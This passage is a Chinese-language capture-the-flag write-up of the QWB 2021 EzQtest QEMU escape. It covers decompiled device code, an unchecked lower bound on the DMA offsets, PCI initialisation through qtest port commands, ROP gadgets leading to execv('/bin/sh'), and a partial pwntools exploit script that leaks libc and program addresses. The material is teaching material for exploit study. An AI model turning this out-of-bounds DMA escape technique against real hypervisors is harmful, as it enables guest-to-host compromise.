                            var_18 = *(arg1 + (zx.q(arg1->dma_idx) dma_info_size == 0)
                            qwb_do_dma(arg1)
                            var_18 = 1
            rax_1 = var_18
        return rax_1
在`qwb_mmio_read`函数中，主要是能够读取`dam_info`的成员变量
    struct qwb_state* qwb_mmio_write(struct QWBState_0* arg1, int64_t arg2, struct qwb_state* arg3, int32_t arg4)
        struct qwb_state* rax = arg1
        struct qwb_state* var_10 = rax
        if (arg4 == 8 && arg2 udma_using = arg3.d
                case 0x389236
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0 && arg3 udma_idx = arg3.d
                case 0x389268
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d udma_idx) + 0x50) dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d udma_idx) + 0x50) dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d udma_idx) dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d udma_idx) __offset(0x0).q = zx.q(arg3.d & 1)
        return rax
`qwb_mmio_write`函数主要是能够设置`dma_info`的成员变量。
    void __cdecl qwb_do_dma(QWBState_0 *opaque)
    {
      _QWORD idx; // [rsp+10h] [rbp-10h]
      _QWORD idxa; // [rsp+10h] [rbp-10h]
      opaque->dma_using = 1;
      for ( idx = 0LL; idx dma_info_size; ++idx )
      {
        if ( opaque->dma_info[idx].cmd )            // device -> address_space
        {
          if ( opaque->dma_info[idx].src + opaque->dma_info[idx].cnt > 0x1000 || opaque->dma_info[idx].cnt > 0x1000 )
            goto end;
        }
        else if ( opaque->dma_info[idx].dst + opaque->dma_info[idx].cnt > 0x1000 || opaque->dma_info[idx].cnt > 0x1000 )
        {                                           // address_space -> device
          goto end;
        }
      }
      for ( idxa = 0LL; idxa dma_info_size; ++idxa )
      {
        if ( opaque->dma_info[idxa].cmd )
          pci_dma_write_3(                          // device -> address_space
            &opaque->pdev,
            opaque->dma_info[idxa].dst,
            &opaque->dma_buf[opaque->dma_info[idxa].src],
            opaque->dma_info[idxa].cnt);
        else
          pci_dma_read_3(
            &opaque->pdev,                          // address_space -> device
            opaque->dma_info[idxa].src,
            &opaque->dma_buf[opaque->dma_info[idxa].dst],
            opaque->dma_info[idxa].cnt);
      }
    end:
      opaque->dma_using = 0;
    }
重点关注的就是这个`qwb_do_dma`函数。该函数能够对`dma_buf`缓冲区进行读取。这里首先会检查`src+cnt`和`dst+cnt`是否大于`0x1000`，以及检查`cnt`是否大于`0x1000`。
但是，这里只检查了上界，并没有检查下界。也就是`src+cnt`和`dst+cnt`是可以为负数，那么这样就可以对`dma_buf`向上读取。
而在向上读取时，与`dma_buf`紧邻的是`dma_info`结构体，那么我们就可以修改`dma_info`来实现任意地址读写。
这道题还有一个特殊点在于，需要与2021
年强网杯的另一道题`EzCloud`结合起来，需要利用那道题的功能与`qemu`建立连接，全部操作都是以`monitor`命令的形式操作。这里本地搭建时为了简便，便直接将`exp`脚本的数据包转发到`qemu`内，使其直接与`qemu`通信，不需要再通过`EzCloud`转发。这里转发数据包使用`socat`:
    #!/bin/sh
    socat TCP4-LISTEN:6666,reuseaddr,fork EXEC:"./launch.sh",stderr
关于`Qtest`命令行的命令，可以参考[这篇文章](https://qemu.readthedocs.io/en/latest/devel/qtest.html)。
###  漏洞利用
####  PCI设备初始化
这道题目的一个难点就在于，他并没有完整实现整个`PCI`设备的初始化，这里需要我们自己去完成`PCI`设备地址的初始化。
参考自[这篇文章](https://github.com/GiantVM/doc/blob/master/pci.md)。
    1、在 do_pci_register_device 中分配内存，对config内容进行设置，如 pci_config_set_vendor_id
    2、在 pci_e1000_realize 中继续设置config，包括 pci_register_bar 中将BAR base address设置为全f
    3、由于有ROM(efi-e1000.rom)，于是调用 pci_add_option_rom ，注册 PCI_ROM_SLOT 为BAR6
    4、pci_do_device_reset (调用链前面提过) 进行清理和设置
    5、KVM_EXIT_IO QEMU => KVM => VM 后，当VM运行port I/O指令访问config信息时，发生VMExit，VM => KVM => QEMU，QEMU根据 exit_reason 得知原因是 KVM_EXIT_IO ，于是从 cpu->kvm_run 中取出 io 信息，最终调用pci_default_read_config
    6、设置完config后，在Linux完成了了对设备的初始化后，就可以进行通信了。当VM对映射的内存区域进行访问时，发生VMExit，VM => KVM => QEMU，QEMU根据 exit_reason 得知原因是 KVM_EXIT_MMIO ，于是从 cpu->kvm_run 中取出 mmio 信息，最终调用e1000_mmio_write
根据这个流程，要正确完成设备配置的需要向`BAR`写`MMIO`的地址。通过文档可以知道`i440fx-pcihost`初始化操作如下：
    static void i440fx_pcihost_realize(DeviceState *dev, Error **errp)
    {
    ..
        sysbus_add_io(sbd, 0xcf8, &s->conf_mem);
        sysbus_init_ioports(sbd, 0xcf8, 4);
        sysbus_add_io(sbd, 0xcfc, &s->data_mem);
        sysbus_init_ioports(sbd, 0xcfc, 4);
    ...
    }
这里如果在命令行中之心命令`info qtree`可以知道`qwb`这个设备是`i440fx-pcihost`下面的设备，则该设备在初始化阶段会沿用父类`i44fx`绑定的端口。
这里初始化所需要的步骤如下：
1、 将`MMIO`地址写入到`qwb`设备的`BAR0`地址
​ 通过 0xcf8 端口设置目标地址
​ 通过 0xcfc 端口写值
2、 将命令写入qwb设备的COMMAND地址，触发`pci_update_mappings`
​ 通过 0xcf8 端口设置目标地址
​ 通过 0xcfc 端口写值
这里首先需要知道`qwb`设备的地址，`qwb`设备的`Bus number`为0，`Device number`为2，`Function
number`为0，得出`qwb`的地址为`0x80001000`。
`BAR0`的偏移为`0x10`，`COMMAND`的偏移为4.
然后我们需要解决写什么值的问题，`MMIO`地址可以直接拿文档一中的地址`0xfebc0000`。而`COMMAND`值的设置就另有说法了，文档二中给出了`COMMAND`的比特位定义：
这里选择`0x107`，即设置`SERR`，`Memory space`和`IO space`、`Bus Master`。
所以最后初始化阶段需要执行的命令如下：
设置`BAR0`地址：
​ 1、`outl 0xcf8 0x80001010`
​ 2、`outl 0xcfc 0xfebc0000`
设置`COMMAND`
3、`outl 0xcf8 0x80001004`
4、`outw 0xcfc 0x107`
执行上述命令之后观察`pci`设备可以看到`BAR0`已经设置上了`0xfeb00000`，对该地址进行读写能正确触发`MMIO handler`的断点。
####  利用思路
**越界读泄漏地址**
首先通过上溢`0xee0`处可以读取到一个`libc`地址。再通过上溢到`opaque->pdev`可以泄漏一个`qemu`程序基址。
**越界写提权**
最开始想直接将`QWBState->pdev->config_read`指针覆盖为`system_plt`地址，将`QWBState->pdev`覆盖为`/bin/sh`地址。但是这样做会使得在覆盖完后，执行`inw`指令时报错。
关于如何`getshell`卡了很久。最终参考[这篇博客](https://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/#more)看到了一种提权的方法。
`matshao`大佬找到两个`gadget`:
    gadget1: 0x3d2f05：lea rdi, "/bin/sh"; call execv
    gadget2: 0x0000000014bd1e: mov rsi, [rbx+0x10]; mov rdx, r12; mov rdi, r14; call qword ptr [rax+0x20];
所以这里将`QWBState->pdev->config_read`指针覆盖为`gadget2`地址，将`QWBState->pdev+0x20`处覆盖为`gadget1`地址即可。
###  EXP
    from pwn import *
    context.update(arch='amd64', os='linux', log_level='debug')
    context.terminal = (['tmux', 'split', '-h'])
    libcname = '/lib/x86_64-linux-gnu/libc.so.6'
    debug = 1
    if debug == 1:
        p = process(
            './qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor  telnet:127.0.0.1:5555,server,nowait -qtest  stdio'.split())
        libc = ELF(libcname)
    else:
        p = remote()
        libc = ELF(libcname)
    def init_pci():
        print("write base")
        p.sendline("outl 3320 {}".format(0x80001010))
        p.sendline("outl 3324 {}".format(0xfebc0000))
        print("write command update")
        p.sendline("outl 3320 {}".format(0x80001004))
        p.sendline("outw 3324 {}".format(0x107))
    BASE = 0xfeb00000
    def set_size(sz):
        p.sendline("writeq {} {}".format(BASE, sz))
        p.recvuntil("OK")
    def get_size():
        p.sendline("readq {}".format(BASE))
        p.recvuntil("OK")
    def set_idx(idx):
        p.sendline("writeq {} {}".format(BASE + 8, idx))
        p.recvuntil("OK")
    def get_idx():
        p.sendline("readq {}".format(BASE + 8))
        p.recvuntil("OK")
    def set_src(addr):
        p.sendline("writeq {} {}".format(BASE + 0x10, addr))
        p.recvuntil("OK")
    def set_dst(addr):
        p.sendline("writeq {} {}".format(BASE + 0x18, addr))
        p.recvuntil("OK")
    def set_cnt(num):
        p.sendline("writeq {} {}".format(BASE + 0x20, num))
        p.recvuntil("OK")
    def set_cmd(num):
        p.sendline("writeq {} {}".format(BASE + 0x28, num))
        p.recvuntil("OK")
    def do_dma():
        p.sendline("readq {}".format(BASE + 0x30))
        p.recvuntil("OK ")
        p.recvuntil("OK ")
    # device -> as
    def dma_write(idx, src, dst, cnt):
        set_idx(idx)
        set_src(src)
        set_dst(dst)
        set_cnt(cnt)
        set_cmd(1)
    # as -> device
    def dma_read(idx, src, dst, cnt):
        set_idx(idx)
        set_src(src)
        set_dst(dst)
        set_cnt(cnt)
        set_cmd(0)
    def writeb64(addr, value):
        encoded = b64e(value)
        p.sendline("b64write {} {} {}".format(addr, len(value), encoded))
        p.recvuntil("OK")
    def readb64(addr, sz):
        p.sendline("b64read {} {}".format(addr, sz))
        p.recvuntil("OK ")
        content = p.recvuntil("\n")
        p.recvuntil("OK ")
        return b64d(content)
    def read_1(addr):
        p.sendline("readq {}".format(addr))
        p.recvuntil("OK ")
        content = p.recvuntil("\n")
        p.recvuntil("OK ")
        return int(content, 16)
    user_buf = 0x40000
    def pwn():
        init_pci()
        print("[+] oob read to leak libc_addr")
        set_size(32)
        dma_write(0, (1<<64)-0xf00, user_buf, 0x1000)
        do_dma()
        data = readb64(user_buf+0x20, 0x10)
        print(data)
        libc_addr = u64(data[8:].ljust(8, b'\x00'))
        print("[+] libc_addr:", hex(libc_addr))
        libc_base = libc_addr-0x1e1072-0xa000
        print("[+] libc_base:",hex(libc_base))
        print("[+] oob read to leak plt_addr")
        dma_write(0, (1<<64)-0xe00, user_buf+0x1000, 0x1000)
        do_dma()
        data = readb64(user_buf+0x1000, 0x10)
        print(data)
        dev_addr = u64(data[8:].ljust(8, b'\x00'))